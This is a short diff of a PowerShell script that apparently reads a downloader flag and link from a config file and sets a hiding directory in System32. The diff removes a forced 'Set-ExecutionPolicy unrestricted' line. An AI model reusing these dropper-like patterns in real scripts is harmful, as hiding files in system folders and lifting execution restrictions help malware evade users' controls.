@@ -12,7 +12,6 @@ $DOWNLOADER  = (Get-Content -Path .\config.txt -TotalCount 3)[-1]
 $HIDE_DIR    = "C:\WINDOWS\System32"
 
 cd $WORKING_DIR
-Set-ExecutionPolicy unrestricted -Force
 
 if ($DOWNLOADER -eq "downloader.TRUE") {
     $LINK = (Get-Content -Path .\config.txt -TotalCount 4)[-1]
